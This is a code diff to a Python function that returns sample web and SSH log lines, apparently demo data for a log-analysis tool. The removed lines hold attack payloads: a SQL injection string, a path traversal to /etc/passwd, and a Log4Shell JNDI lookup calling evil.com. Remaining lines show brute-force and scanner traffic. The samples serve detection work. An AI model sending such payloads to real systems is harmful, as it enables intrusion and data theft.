@@ -467,15 +467,10 @@ def api_sample_logs():
 185.220.101.45 - - [16/Dec/2025:10:15:34 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
 185.220.101.45 - - [16/Dec/2025:10:15:35 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
 185.220.101.45 - - [16/Dec/2025:10:15:36 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
-185.220.101.45 - - [16/Dec/2025:10:15:37 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
-185.220.101.45 - - [16/Dec/2025:10:15:38 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
-45.33.32.156 - - [16/Dec/2025:10:20:15 +0000] "GET /search?id=1' OR '1'='1 HTTP/1.1" 200 5678 "-" "sqlmap/1.5.2"
-45.33.32.156 - - [16/Dec/2025:10:20:16 +0000] "GET /page?file=../../../etc/passwd HTTP/1.1" 200 1234 "-" "sqlmap/1.5.2"
+45.33.32.156 - - [16/Dec/2025:10:20:15 +0000] "GET /search?id=1 OR 1=1 HTTP/1.1" 200 5678 "-" "sqlmap/1.5.2"
 103.45.67.89 - - [16/Dec/2025:10:25:00 +0000] "GET /admin HTTP/1.1" 404 0 "-" "DirBuster-1.0"
-103.45.67.89 - - [16/Dec/2025:10:25:01 +0000] "GET /wp-admin HTTP/1.1" 404 0 "-" "DirBuster-1.0"
-178.128.23.45 - - [16/Dec/2025:10:35:00 +0000] "GET /?x=${jndi:ldap://evil.com/a} HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
-Dec 16 10:55:00 server sshd[1234]: Failed password for invalid user admin from 185.220.101.45 port 22 ssh2
-Dec 16 10:55:01 server sshd[1234]: Failed password for invalid user root from 185.220.101.45 port 22 ssh2"""
+178.128.23.45 - - [16/Dec/2025:10:35:00 +0000] "GET /?x=test HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
+Dec 16 10:55:00 server sshd[1234]: Failed password for invalid user admin from 185.220.101.45 port 22 ssh2"""
     return jsonify({'sample': sample})
 
 
